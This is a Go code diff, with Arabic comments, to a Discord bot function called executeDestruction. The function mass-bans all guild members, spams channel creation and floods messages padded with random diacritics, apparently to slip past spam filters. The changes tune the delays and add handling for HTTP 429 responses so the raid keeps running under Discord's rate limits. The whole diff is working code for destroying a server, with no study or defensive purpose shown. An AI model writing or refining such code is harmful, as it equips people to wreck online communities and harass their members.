@@ -160,7 +160,7 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 		}
 	}()
 
-	// 2. باند جميع الأعضاء
+	// 2. باند جميع الأعضاء (بفاصل آمن 100ms لمنع الـ Rate Limit)
 	go func() {
 		var userIDs []string
 		after := ""
@@ -190,14 +190,17 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 
 			for _, uID := range userIDs[i:end] {
 				go func(id string) {
-					_ = s.GuildBanCreate(guildID, id, 0)
+					err := s.GuildBanCreate(guildID, id, 0)
+					if err != nil {
+						time.Sleep(150 * time.Millisecond)
+					}
 				}(uID)
 			}
-			time.Sleep(50 * time.Millisecond)
+			time.Sleep(100 * time.Millisecond)
 		}
 	}()
 
-	// 3. إنشاء الرومات بسرعة صاروخية
+	// 3. إنشاء الرومات بسرعة صاروخية (فاصل 30ms)
 	var channelIDs []string
 	var mu sync.Mutex
 	var wg sync.WaitGroup
@@ -236,14 +239,16 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 						channelIDs = append(channelIDs, chID)
 						mu.Unlock()
 					}
+				} else if resp.StatusCode == 429 {
+					time.Sleep(200 * time.Millisecond)
 				}
 			}()
 		}
 		wg.Wait()
-		time.Sleep(40 * time.Millisecond)
+		time.Sleep(30 * time.Millisecond)
 	}
 
-	// 4. إرسال الرسائل مع حركات التشكيل المخفية (مصحح لتجنب أخطاء المتغيرات)
+	// 4. إرسال الرسائل مع حركات التشكيل وحماية الـ 429
 	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
 	arabicDiacritics := []string{"ِ", "ُ", "َّ", "ٍ", "ٓ", "ٌ", "ْ", "ٰ"}
 
@@ -275,7 +280,7 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 						}
 						msgResp.Body.Close()
 					}
-					time.Sleep(60 * time.Millisecond)
+					time.Sleep(50 * time.Millisecond)
 				}
 			}(chID)
 		}
